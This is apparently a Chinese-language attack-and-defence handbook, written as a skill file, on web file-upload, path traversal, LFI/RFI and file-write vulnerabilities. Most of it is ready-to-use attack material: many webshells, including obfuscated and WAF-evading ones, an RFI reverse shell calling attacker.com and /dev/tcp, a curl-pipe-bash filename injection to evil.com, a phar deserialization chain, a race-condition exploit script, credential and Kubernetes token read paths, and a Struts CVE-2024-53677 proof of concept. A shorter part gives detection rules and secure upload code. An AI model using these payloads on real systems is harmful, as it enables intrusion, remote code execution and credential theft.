---
name: web-file-handling
description: >
  全面覆盖 Web 应用文件操作相关的安全漏洞。涵盖文件上传漏洞（Webshell、
  双扩展名、MIME 绕过、内容类型绕过、图片马）、路径遍历/LFI（本地文件包含）、
  RFI（远程文件包含）、任意文件下载/读取、文件写入、零字节截断、
  PHP 伪协议利用、日志投毒、/proc/self 利用、phar 反序列化，
  包含防御侧的安全上传、路径验证、文件存储隔离。
domain: cybersecurity
subdomain: web-security
tags: [file-upload, lfi, rfi, path-traversal, webshell, file-download, local-file-inclusion, owasp]
version: 2.0.0
---

# 文件操作漏洞 — 完整攻防手册

## 适用场景

- 应用有文件上传功能（头像、附件、文档导入）
- URL 参数包含文件名/路径（`?file=report.pdf`、`?page=about`）
- 应用使用 `include`/`require` 动态加载文件
- 应用提供文件下载/导出功能
- 代码审计中发现文件操作函数使用用户输入

---

## Part A：攻击方法论

### 1. 路径遍历 / LFI

#### 1.1 基础路径遍历

```
# Unix
../../../etc/passwd
../../../etc/shadow
../../../../etc/passwd
....//....//....//etc/passwd        # 双编码/过滤器绕过
..%2f..%2f..%2fetc/passwd           # URL 编码 /
..%252f..%252f..%252fetc/passwd     # 双重 URL 编码
..%c0%af..%c0%afetc/passwd          # Unicode 编码
..%ef%bc%8f..%ef%bc%8fetc/passwd    # 全角字符 /

# Windows
..\..\..\windows\system32\config\sam
..\..\..\boot.ini
..%5c..%5c..%5cwindows\system32\config\sam
..%255c..%255c..%255cwindows        # 双重编码

# 绝对路径（无需遍历）
/etc/passwd
C:\Windows\System32\drivers\etc\hosts
```

#### 1.2 LFI 利用链

```bash
# === PHP 伪协议 ===

# php://filter — 读取源码（base64 编码避免解析）
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php

# php://input — 执行 POST 数据中的 PHP 代码
?file=php://input
POST: <?php system('id'); ?>

# php://data — 内联数据
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7
# base64("<?php system($_GET['cmd']);?>")
&cmd=id

# phar:// — 反序列化攻击
# 上传一个恶意 phar 文件，然后通过 LFI 触发反序列化
?file=phar:///var/www/uploads/malicious.phar

# === 日志投毒 ===
# 1. 找到日志文件路径
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log

# 2. 在 User-Agent 或请求中注入 PHP 代码
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# 3. 通过 LFI 包含日志
?file=/var/log/apache2/access.log&cmd=id

# === /proc/self 利用 ===
# 读取当前进程的环境变量（可能含数据库密码、API 密钥）
?file=/proc/self/environ

# 读取文件描述符（获取其他请求/文件内容）
?file=/proc/self/fd/0    # stdin
?file=/proc/self/fd/1    # stdout
?file=/proc/self/fd/2    # stderr
?file=/proc/self/fd/10   # 可能是打开的文件
# 枚举 0-100 找到有内容的 fd

# === /proc 版本信息（确认内核版本选择提权 exploit） ===
?file=/proc/version

# === Session 文件包含 ===
# 找到 session 存储路径（通常 /tmp/sess_XXXX 或 /var/lib/php/sessions/sess_XXXX）
# 在 session 中注入代码（通过用户名等字段）
# 然后包含 session 文件
?file=/tmp/sess_abc123&cmd=id
```

#### 1.3 RFI（远程文件包含）

```
# 条件: php.ini 中 allow_url_include = On
?file=http://attacker.com/shell.php
?file=http://attacker.com/shell.txt   # txt 扩展名绕过扩展名检查

# 攻击者服务器上的 shell.php
<?php system($_GET['cmd']); ?>

# RFI → 反弹 shell
?file=http://attacker.com/shell.php&cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

### 2. 文件上传漏洞

#### 2.1 基础利用

```bash
# 直接上传 Webshell
# shell.php
<?php system($_GET['cmd']); ?>

# 一句话木马（多种语言）
<?php @eval($_POST['cmd']); ?>                    # PHP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>  # JSP
<%= System.Diagnostics.Process.Start("cmd","/c " + Request["cmd"]) %>  # ASPX

# 图片马（在合法图片中嵌入 PHP 代码）
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# 或
copy image.jpg/b + shell.php/a webshell.jpg.php

# .htaccess 攻击（Apache）
# 上传 .htaccess 使 .jpg 文件被解析为 PHP
AddType application/x-httpd-php .jpg
# 然后上传 shell.jpg，会被当作 PHP 执行
```

#### 2.2 绕过技巧

```
# 扩展名绕过
shell.php           → 被拦截
shell.php3          → PHP 3
shell.php4          → PHP 4
shell.php5          → PHP 5
shell.php7          → PHP 7
shell.phtml         → PHP HTML
shell.pHp           → 大小写混淆
shell.php.jpg       → 双扩展名（某些配置从右向左解析）
shell.php%00.jpg    → 空字节截断（PHP < 5.3.4）
shell.php\x00.jpg   → 空字节截断
shell.PHP           → 大小写（Windows/IIS）
shell.php.          → 末尾点号（Windows 去除尾部点和空格）
shell.php%20        → 空格（Windows）
shell.php::$DATA    → NTFS ADS（Windows）

# MIME 类型绕过
Content-Type: image/jpeg    # 伪造 MIME 类型
# 服务端仅检查 Content-Type 而不检查文件内容

# 魔术字节绕过
# 在 shell.php 开头添加图片魔术字节
GIF89a<?php system($_GET['cmd']); ?>

# 文件头伪造
# JPEG: FF D8 FF E0
# PNG: 89 50 4E 47
# GIF: 47 49 46 38
printf '\xff\xd8\xff\xe0' > shell.php
cat real_shell.php >> shell.php

# 竞争条件（服务端先保存后检查再删除）
# 在保存和删除之间的窗口访问文件
# 工具: 使用多线程并发上传和访问
```

#### 2.3 高级绕过技巧（实战经验补充）

> 来源：cloudsec/50个文件上传绕过技巧（一线绕过 WAF / 云防护的进阶技巧）

```
=== A. 框架/前端特性滥用 ===

1. Vue/Angular 截断
   file.name = "legit.jpg;.php"
   → 前端框架渲染时按 ; 截断，实际传给后端的可能是 legit.php

2. AngularJS 沙箱逃逸（无 angular-santize 时）
   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} });alert(1);//');}}

3. input webkitdirectory 上传目录结构（Chrome）
   <input type="file" webkitdirectory>
   → 整个目录上传，绕过单文件黑名单

=== B. 文件结构注入 ===

4. 文件头 + 注释注入
   #define width 1337
   #define height 1337
   <?php system($_GET['cmd']); ?>
   → XBM 头合法，PHP 解析时仍执行

5. exiftool 注入（绕过 exif_imagetype 检测）
   exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
   → EXIF 中 PHP 代码 + 配合 LFI 触发

6. 多层 ZIP / 嵌套压缩
   shell.php → 压缩成 shell.zip → 改名 shell.jpg
   配合 zip:// 或 phar:// 解析

=== C. 解析漏洞利用 ===

7. Apache 路径解析缺陷（AddHandler 配置）
   上传：exploit.php.jpg
   访问：/uploads/exploit.php.jpg/.   → Apache 按 .php 解析

8. Nginx 配置错误（cgi.fix_pathinfo=1）
   location ~ \.php$ {
       fastcgi_pass 127.0.0.1:9000;
       include fastcgi_params;
   }
   绕过：上传 shell.jpg
   访问：/shell.jpg%20%00.php  → Nginx 转发给 PHP-FPM 执行

9. IIS 短文件名（8.3 格式）
   检测：/uplo~1/.aspx*
   上传：ThisIsMyShellFile.aspx
   实际访问：/THISIS~1.ASP

10. IIS 6.0 解析漏洞（;.jpg）
    shell.asp;.jpg → IIS 按 asp 解析

=== D. 协议层绕过 ===

11. 分块传输编码
    POST /upload.php HTTP/1.1
    Transfer-Encoding: chunked

    5
    ;.php
    ?
    <?php system($_GET['cmd']); ?>
    0
    → 绕过基于 Content-Length 的 WAF 检测

12. multipart boundary 注入
    ------WebKitFormBoundaryXYZ
    Content-Disposition: form-data; name="file"; filename="legit.jpg"
    Content-Type: image/jpeg

    ------WebKitFormBoundaryXYZ
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: application/x-php
    → 部分服务端只取第一个 filename，但实际处理的是最后一个

13. WebSocket 隧道传输（绕过 HTTP WAF）
    const ws = new WebSocket('wss://target.com/upload');
    ws.onopen = () => {
        const chunks = splitFile(maliciousFile);
        chunks.forEach(c => ws.send(JSON.stringify({chunk: c})));
    };

=== E. 业务逻辑层绕过 ===

14. 文件名覆盖逻辑
    multipart 中 file 字段 + filename 字段
    POST: file=@shell.php
    Body: filename=legit.jpg
    → 服务端用 multipart filename 黑名单检查，用 POST 字段实际存储

15. 临时文件保留
    服务端 multipart 处理时保留临时文件 /tmp/phpXXXXXX
    配合 PHP 漏洞（如 CVE-2017-5487）触发包含

16. 二次渲染绕过
    服务端用 imagecreatefromjpeg 二次渲染
    → 找二次渲染后仍保留的字段（EXIF、APP1 段）注入
    → GIF：在透明区域插入 PHP 代码
    → PNG：利用 PLTE / IDAT 块
    → 工具：https://github.com/hx1942/Bypass-Disposition
```

**实战审计 Grep（补充）**：

```
# 找解析漏洞配置
find . -name "httpd.conf" -o -name "nginx.conf" -o -name "web.config"
grep -E "AddHandler|cgi.fix_pathinfo|location.*\.php" httpd.conf nginx.conf

# 找前端框架
grep -rE "webkitdirectory|file.name\s*=.*\.php" frontend/

# 找 chunked 处理
grep -rE "Transfer-Encoding|chunked" --include="*.py" --include="*.js"

# 找 EXIF 检测绕过
grep -rE "exif_imagetype|getimagesize" --include="*.php"
```

#### 2.4 进阶绕过技巧（实战补充 Part 2）

> 来源：cloudsec/50个文件上传绕过技巧（编号 #1/#14/#18/#19/#21/#25/#29/#36/#37/#38/#44/#45/#46/#49）
> 涵盖客户端、协议层、容器/云原生、操作系统层 4 大类高频实战技巧

```
=== F. 客户端检测突破 ===

1. 前端 JS 检测绕过（最常见）
   场景：<input type="file" accept="image/*" onchange="checkFile()">
   绕过：
   a. 直接 Burp 改 filename + Content-Type，绕过前端 accept 限制
   b. 浏览器 DevTools 改 checkFile 函数 → checkFile = () => true
   c. curl --referer "https://target.com" -F "file=@shell.php;type=image/jpeg"
   d. 拦截 XHR 改 multipart 包体

2. JS 校验代码逆向
   grep -oE "checkFile|allowedExt|validateFile" frontend-bundle.js
   找到合法扩展名列表 → 直接构造合法名

=== G. HTTP 协议层进阶 ===

3. HTTP 请求走私（CL.TE / TE.CL）
   前端代理信任 Content-Length，后端信任 Transfer-Encoding
   POST /upload HTTP/1.1
   Content-Length: 4
   Transfer-Encoding: chunked

   5;.php
   <?php system($_GET['cmd']); ?>
   0

   → 后端只读 chunked 部分，缓存为 shell.php

4. HTTP/2 帧注入（绕 HTTP/1.x WAF）
   :method: POST
   :path: /upload
   :authority: target.com
   content-type: multipart/form-data
   # HTTP/2 二进制帧，多数 WAF 不深度解析
   # 工具：nghttp2 / hyper / curl --http2

5. QUIC 协议利用（绕 HTTP WAF）
   quicly --request -U https://target.com/upload -d @shell.php
   # QUIC over UDP，传统 HTTP WAF（基于 TCP 80/443）失效

=== H. 文件结构注入进阶 ===

6. SVG-XSS 组合攻击
   <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('/malicious')">
   <script>alert(document.domain)</script>
   </svg>
   上传 evil.svg → 访问 https://target.com/uploads/evil.svg
   → 浏览器执行 JS（同源策略下取到 cookie）
   修复：禁止 SVG 上传，或服务端用 librsvg 渲染为 PNG 输出

7. 字体文件 @font-face RCE
   @font-face {
     font-family: 'poc';
     src: url('shell.woff') format('woff');
   }
   配合 IE/旧版浏览器 CSS 表达式：在 woff 文件中嵌入 PHP 代码 + 服务器解析为 PHP

8. 多语言编码冲突（GBK vs UTF-8）
   filename = "壳.php"  → GBK 编码为 \xbf\xbd.php
   # 后端 UTF-8 解码：\xbf\xbd → U+FFFD 替换字符
   # 若黑名单只匹配 ".php" → 实际文件名包含 U+FFFD 而绕过
   # 但 Apache/Nginx 配置不当仍可能按 PHP 解析

9. OLE 对象注入（Office 文档）
   在 .docx/.xlsx 中嵌入 OLE 对象 → VBA 宏执行
   olevba -c "CreateObject('WScript.Shell').Run('calc.exe')" malicious.docx
   上传到 SharePoint / Confluence → 钓鱼下载

=== I. 容器与云原生场景 ===

10. 容器镜像污染
    FROM alpine:latest
    COPY legit-app /app
    COPY shell.php /app/public/uploads/legit.jpg
    → 攻击者推送恶意镜像到内网镜像仓库
    → 业务 pull 后 Webshell 已就位
    防御：镜像签名（Cosign）/ 镜像扫描（Trivy）

11. Serverless 函数劫持（AWS Lambda / 阿里云函数计算）
    exports.handler = async (event) => {
      const fs = require('fs');
      // 上传内容写到 /tmp/
      fs.writeFileSync('/tmp/' + event.filename, event.body);
      // 攻击者上传 shell.js 到 /tmp/，再触发 require('/tmp/shell')
    };
    防御：/tmp 只读，禁止 require 用户可控路径

12. K8s ConfigMap 滥用
    kubectl create configmap webshell \
      --from-file=shell.php=./shell.php
    # 把 ConfigMap 挂载为 Pod 文件
    # 攻击者拿到 kubectl 权限 → 投递 ConfigMap → 业务挂载执行
    防御：RBAC 限制 ConfigMap 创建，准入控制（OPA Gatekeeper）

=== J. 操作系统层利用 ===

13. Windows NTFS ADS（备用数据流）
    上传：legit.jpg:shell.php
    → Windows NTFS 把 shell.php 作为 legit.jpg 的 ADS 存储
    → IIS 配置不当时可直接访问 shell.php 内容
    # 检测：
    dir /R | findstr ":"

14. Linux 通配符滥用（shell glob）
    upload_file '[x]shell.php'
    → 若目标目录存在名为 x 的文件，shell 展开为 xshell.php
    → 业务日志/审计中可能漏掉
    # 配合定时任务：
    * * * * * /usr/local/bin/process [x]upload.php
    → 实际执行 xshell.php（若目录中存在 xshell.php）

15. 文件系统硬链接
    ln /etc/passwd /var/www/html/images/shell.php
    # 上传图片马触发 PHP 解析 /etc/passwd
    # 或：ln malicious.php /var/www/html/uploads/avatar.jpg
    # → 修改 avatar.jpg 即修改 malicious.php
    防御：上传目录与代码目录分离，文件系统 quota

16. 计划任务触发
    上传文件名：'; curl http://evil.com/shell.sh | bash; #
    → 若服务端把文件名写入 crontab（如备份/清理任务）
    → RCE
    防御：文件名严格白名单（[a-zA-Z0-9._-]）

17. 环境变量注入
    上传文件名：PATH=/tmp:$PATH;chmod +x shell;./shell
    → 若服务端通过 fork + exec 调用子进程处理文件
    → 文件名被 split 后作为环境变量传给子进程
    防御：子进程前 unset PATH，使用绝对路径调用

=== K. 云存储场景进阶 ===

18. Azure Blob 元数据注入
    PUT https://mystorage.blob.core.windows.net/mycontainer/shell.jpg
    x-ms-meta-content: <?php system($_GET['cmd']); ?>
    → 后端读 metadata 直接输出 → 触发 PHP 解析

19. Cloudflare Workers 代理
    addEventListener('fetch', event => {
      event.respondWith(fetch(event.request).then(r => {
        // 修改 response 注入 JS
      }));
    });
    → 攻击者上传 Worker → 拦截所有上传流量

20. 云日志注入 → 文件落地
    # 阿里云 SLS / 腾讯云 CLS / AWS CloudWatch
    # 攻击者通过上传日志，把日志投递到 OSS/S3
    import logging
    logger.info('<?php system($_GET["cmd"]);?>')
    → 投递到 /var/log/app.log → 重命名为 .php → RCE
```

**实战审计 Grep（Part 2）**：

```
# 客户端 JS 检测
grep -rE "accept=|onchange.*check|allowedExt" frontend/

# HTTP 协议层
grep -rE "Transfer-Encoding|HTTP/2|QUIC" nginx.conf httpd.conf

# SVG / 字体
grep -rE "\.svg|\.woff|@font-face|<svg" --include="*.php" --include="*.java"

# 容器/云原生
grep -rE "kubectl|FROM.*COPY|ConfigMap" Dockerfile k8s/
find . -name "Dockerfile" -o -name "*.yaml" | xargs grep -l "COPY"

# 操作系统层
grep -rE "exec\s*\(|system\s*\(|popen\s*\(" --include="*.py" --include="*.go"
find /var/spool/cron -type f -newer /tmp/marker
```

### 3. 任意文件下载/读取

```
# 常见参数名
?file=report.pdf
?path=/data/export.csv
?download=document.docx
?filename=config.yaml
?src=/files/image.png

# 利用
?file=../../../etc/passwd
?file=/etc/shadow
?file=/var/www/html/config.php
?file=/var/www/html/wp-config.php
?file=../../../../home/user/.ssh/id_rsa
?file=../../../../home/user/.bash_history
?file=/proc/self/environ

# Java 特定
?file=WEB-INF/web.xml
?file=WEB-INF/classes/application.properties
?file=WEB-INF/application.yml

# .NET 特定
?file=web.config
?file=connectionstrings.config
?file=appsettings.json
```

### 4. 文件写入漏洞

```
# 写入 Webshell
POST /api/export
{"filename":"shell.php","content":"<?php system($_GET['cmd']); ?>"}

# 路径遍历写入
POST /api/save
{"path":"../../../var/www/html/shell.php","data":"<?php system($_GET['cmd']); ?>"}

# 通过模板引擎写入
# SSTI → 写文件
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('cat > /var/www/html/shell.php << EOF\n<?php system($_GET[cmd]); ?>\nEOF', shell=True) }}
```

---

## Part B：检测与防御

### 5. 检测规则

```yaml
title: Path Traversal / LFI Pattern
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "../../../"
      - "..\\..\\"
      - "/etc/passwd"
      - "/proc/self"
      - "php://filter"
      - "php://input"
      - "data://text/plain"
      - "phar://"
  condition: selection
level: high
tags:
  - attack.t1190
```

### 6. 修复方案

#### 6.1 安全文件上传

```python
import os
import secrets
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
MAX_SIZE = 10 * 1024 * 1024  # 10MB
UPLOAD_DIR = '/var/www/uploads/'

def safe_upload(file):
    # 1. 扩展名白名单
    ext = file.filename.rsplit('.', 1)[-1].lower() if '.' in file.filename else ''
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("File type not allowed")

    # 2. MIME 类型验证（不信任 Content-Type）
    import magic
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    allowed_mimes = {
        'image/png': 'png', 'image/jpeg': 'jpg', 'image/gif': 'gif',
        'application/pdf': 'pdf'
    }
    if mime not in allowed_mimes:
        raise ValueError(f"MIME type not allowed: {mime}")

    # 3. 内容验证（确保是真实图片/PDF）
    if mime.startswith('image/'):
        from PIL import Image
        try:
            img = Image.open(file)
            img.verify()
        except Exception:
            raise ValueError("Invalid image file")

    # 4. 随机文件名（不使用原始文件名）
    new_name = secrets.token_hex(16) + '.' + ext

    # 5. 存储到安全目录（不在 web root 下）
    save_path = os.path.join(UPLOAD_DIR, new_name)

    # 6. 路径验证
    real_path = os.path.realpath(save_path)
    real_upload = os.path.realpath(UPLOAD_DIR)
    if not real_path.startswith(real_upload):
        raise ValueError("Path traversal detected")

    file.save(save_path)
    return new_name
```

#### 6.2 安全文件包含/读取

```python
# 安全文件读取
import os

BASE_DIR = '/var/www/data/'

def safe_read(filename):
    # 1. 仅使用文件名，禁止路径
    safe_name = os.path.basename(filename)

    # 2. 白名单验证
    allowed_files = ['report1.pdf', 'report2.pdf', 'data.csv']
    if safe_name not in allowed_files:
        raise ValueError("File not in whitelist")

    # 3. 构造完整路径并验证
    full_path = os.path.join(BASE_DIR, safe_name)
    real_path = os.path.realpath(full_path)

    if not real_path.startswith(os.path.realpath(BASE_DIR)):
        raise ValueError("Path traversal detected")

    return open(real_path, 'rb').read()
```

#### 6.3 Web 服务器配置

```nginx
# Nginx — 禁止执行上传目录中的 PHP
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}

# Nginx — 限制文件大小
client_max_body_size 10M;
```

```apache
# Apache — 上传目录禁止执行
<Directory /var/www/uploads>
    php_flag engine off
    <FilesMatch "\.(?:php|phtml|php[0-9])$">
        Order deny,allow
        Deny from all
    </FilesMatch>
</Directory>
```

---

## 速查表

### LFI 常用文件路径

| 目标 | Linux | Windows |
|------|-------|---------|
| 系统用户 | `/etc/passwd` | `C:\Windows\System32\config\SAM` |
| 系统版本 | `/proc/version` | `C:\Windows\System32\license.rtf` |
| 环境变量 | `/proc/self/environ` | N/A |
| 进程信息 | `/proc/self/cmdline` | N/A |
| 网络配置 | `/etc/network/interfaces` | `C:\Windows\System32\drivers\etc\hosts` |
| Apache 日志 | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |
| Nginx 日志 | `/var/log/nginx/access.log` | N/A |
| PHP Session | `/tmp/sess_XXXX` | `C:\Windows\Temp\sess_XXXX` |
| SSH 密钥 | `/home/user/.ssh/id_rsa` | N/A |
| MySQL 配置 | `/etc/mysql/my.cnf` | `C:\ProgramData\MySQL\my.ini` |
| WordPress 配置 | `/var/www/html/wp-config.php` | N/A |

### 文件上传绕过矩阵

| 防御层 | 绕过方法 |
|--------|---------|
| 客户端 JS 验证 | 禁用 JS / Burp 修改请求 |
| 扩展名黑名单 | `.php3/.phtml/.php.jpg` |
| 扩展名白名单 | `.htaccess` / `.user.ini` / 竞争条件 |
| MIME 检查 | 修改 `Content-Type` 头 |
| 文件头检查 | 伪造魔术字节 (`GIF89a`) |
| 图片验证 | 图片马 (`exiftool`) |
| 文件重命名 | 结合 `.user.ini` 指定 PHP 解析 |
| 上传目录不可执行 | 上传到其他路径（路径遍历） |

### Part C：进阶利用与更新

#### C1. `.user.ini` 利用 (PHP CGI/FastCGI)

```ini
; 上传 .user.ini 到上传目录
; 条件: PHP 以 CGI/FastCGI 模式运行
auto_prepend_file=/tmp/shell.php   ; 每个请求前自动包含
auto_append_file=/tmp/shell.php    ; 每个请求后自动包含

; 或直接包含图片马
auto_prepend_file=shell.gif        ; 当前目录下的图片马

; 限制: user_ini.filename 默认 .user.ini
;        user_ini.cache_ttl 默认 300 秒 (最长需等待 5 分钟)
```

#### C2. Phar 反序列化攻击链

```php
// 1. 创建恶意 phar 文件
<?php
class EvilClass {
    function __destruct() {
        system($_GET['cmd']);
    }
}
$phar = new Phar('malicious.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new EvilClass();
$phar->setMetadata($obj);  // 序列化对象
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>

// 2. 上传 malicious.phar (改为 .jpg 扩展名绕过检查)
// 3. 通过 LFI/文件操作触发反序列化
// 任何文件操作函数都能触发: file_exists(), fopen(), file_get_contents(), is_file()
?file=phar:///var/www/uploads/malicious.jpg&cmd=id

// 受影响函数列表:
file_exists, fopen, file_get_contents, file_put_contents,
is_file, is_dir, is_readable, is_writable, is_executable,
stat, lstat, touch, unlink, copy, rename, include, require,
include_once, require_once, parse_ini_file, opendir, scandir
```

#### C3. 竞争条件利用 (Race Condition)

```bash
# 方法1: 多线程并发上传+访问
# 终端1: 持续上传
while true; do
  curl -F "file=@shell.php" http://target/upload.php
done

# 终端2: 持续访问
while true; do
  curl http://target/uploads/shell.php?cmd=id
done

# 方法2: Python 并发脚本
import requests
import threading

def upload():
    while True:
        requests.post('http://target/upload.php',
                      files={'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')})

def access():
    while True:
        r = requests.get('http://target/uploads/shell.php?cmd=id')
        if 'uid=' in r.text:
            print(f"[+] Shell executed: {r.text}")
            break

for i in range(10):
    threading.Thread(target=upload, daemon=True).start()
    threading.Thread(target=access, daemon=True).start()
```

#### C4. WebShell 免杀/WAF Bypass 技术

```php
// === 回调函数免杀 ===
<?php array_map('assert', $_POST['cmd']); ?>
<?php call_user_func('system', $_POST['cmd']); ?>
<?php array_filter($_POST, 'system'); ?>
<?php usort(...$_REQUEST); ?>  // PHP7+ 可变参数

// === 可变函数免杀 ===
<?php $f = 'sys'.'tem'; $f($_POST['cmd']); ?>
<?php $_ = 'system'; $_($_POST['cmd']); ?>

// === HTTP 头传参 ===
<?php system($_SERVER['HTTP_USER_AGENT']); ?>
// curl -A "id" http://target/shell.php

// === 编码/加密免杀 ===
<?php eval(str_rot13($_POST['cmd'])); ?>
<?php eval(base64_decode($_POST['cmd'])); ?>
// POST cmd=base64_encode(system('id'));

// === 无字母数字 WebShell ===
<?php $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___($_POST[_]);?>
// 相当于 assert($_POST[_])
```

#### C5. 容器环境下的文件操作漏洞

```bash
# Docker/Kubernetes 环境中的额外利用点

# 读取容器元数据
?file=/proc/self/cgroup        # 确认是否在容器中
?file=/proc/1/cgroup           # PID 1 的 cgroup

# 读取 Docker Secret
?file=/run/secrets/db_password
?file=/etc/config/app_config.yaml

# 读取 Kubernetes ServiceAccount Token
?file=/var/run/secrets/kubernetes.io/serviceaccount/token
?file=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
?file=/var/run/secrets/kubernetes.io/serviceaccount/namespace

# 读取容器环境变量（可能含云凭证）
?file=/proc/self/environ
# 常见: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DATABASE_URL

# 通过 /proc/self/mountinfo 发现挂载点
?file=/proc/self/mountinfo
# 可能发现: NFS 共享、持久卷、ConfigMap 挂载
```

#### C6. Java/Node.js 安全文件处理代码

```java
// Java 安全文件读取
import java.nio.file.*;

public class SafeFileRead {
    private static final Path BASE_DIR = Paths.get("/var/www/data/").toAbsolutePath().normalize();

    public static byte[] safeRead(String filename) throws SecurityException {
        // 1. 仅使用文件名部分
        String safeName = Paths.get(filename).getFileName().toString();

        // 2. 构造完整路径
        Path targetPath = BASE_DIR.resolve(safeName).toAbsolutePath().normalize();

        // 3. 验证路径在基目录内
        if (!targetPath.startsWith(BASE_DIR)) {
            throw new SecurityException("Path traversal detected");
        }

        // 4. 验证文件存在且为常规文件
        if (!Files.isRegularFile(targetPath)) {
            throw new SecurityException("File not found or not regular");
        }

        try {
            return Files.readAllBytes(targetPath);
        } catch (Exception e) {
            throw new SecurityException("Read error: " + e.getMessage());
        }
    }
}
```

```javascript
// Node.js 安全文件上传
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const fileType = require('file-type');

const ALLOWED_TYPES = new Set(['image/png', 'image/jpeg', 'image/gif', 'application/pdf']);
const MAX_SIZE = 10 * 1024 * 1024; // 10MB
const UPLOAD_DIR = '/var/www/uploads/';

async function safeUpload(file) {
    // 1. 文件大小检查
    if (file.size > MAX_SIZE) throw new Error('File too large');

    // 2. 随机文件名
    const ext = path.extname(file.name).toLowerCase();
    const newName = crypto.randomBytes(16).toString('hex') + ext;

    // 3. 路径验证
    const targetPath = path.resolve(UPLOAD_DIR, newName);
    if (!targetPath.startsWith(path.resolve(UPLOAD_DIR))) {
        throw new Error('Path traversal detected');
    }

    // 4. 真实 MIME 类型检查
    const buffer = fs.readFileSync(file.path);
    const type = await fileType.fromBuffer(buffer);
    if (!type || !ALLOWED_TYPES.has(type.mime)) {
        fs.unlinkSync(file.path);
        throw new Error('Invalid file type');
    }

    // 5. 保存
    fs.renameSync(file.path, targetPath);
    return newName;
}
```

#### C7. WAF 绕过矩阵 (更新)

| WAF 类型 | 绕过方法 | 示例 |
|----------|---------|------|
| 关键字检测 | 编码/拆分 | `sy"+"stem` / `%73ystem` |
| 正则匹配 | 双重编码 | `..%252f..%252f` |
| 文件内容检测 | 图片马 | `exiftool -Comment='<?php ...?>' img.jpg` |
| MIME 检测 | 删除 Content-Type | 部分WAF不检测空 Content-Type |
| 文件大小限制 | 分段上传 | 将 shell 分多个包发送 |
| 扩展名检测 | `.user.ini` + 图片 | 不上传 PHP，上传配置文件 |
| 行为分析 | 延迟执行 | `sleep(30); system($cmd);` |
| RASP 检测 | JNI/Native 调用 | Java JNI 绕过 Java 层限制 |

---

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Credential Access | Unsecured Credentials | T1552 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Exfiltration | Data from Local System | T1005 |
| Execution | Command and Scripting Interpreter | T1059 |

## 前置条件

- 目标应用有文件操作功能
- Burp Suite 用于拦截和修改请求
- 常用 Webshell 文件准备
- 了解服务端语言和操作系统
- 容器环境需额外了解 Docker/K8s 文件布局

---

## Part D：2025-2026 最新研究补充

### D1. CVE-2024-53677 — Apache Struts 文件上传（S2-067）

2024-12 披露，**Critical** 级别。Apache Struts 近 10 年来最严重文件上传漏洞。

#### D1.1 漏洞原理

- **影响**: Struts 2.0.0 - 6.3.0（所有 6.4.0 之前的版本）
- **根因**: `FileUploadInterceptor` 组件对文件上传参数处理缺陷
- **攻击向量**: 操纵文件上传参数实现路径遍历
- **影响**: 未认证路径遍历 → 任意文件写 → RCE

#### D1.2 POC

```http
POST /upload.action HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="upload"; filename="../../../webapps/ROOT/shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
------boundary--
```

#### D1.3 关键点

- 漏洞位置：FileUploadInterceptor 而非 commons-fileupload
- 旧版 Struts（2.0.0-2.3.37, 2.5.0-2.5.33）EOL 不再修复
- 与 CVE-2023-50164 类似但根因不同

#### D1.4 防御

- 升级到 Struts 6.4.0+
- EOL 用户：迁移到其他框架或购买商业支持
- WAF 规则：阻止 `../` 在 filename 参数中
- 文件上传目录禁止执行权限

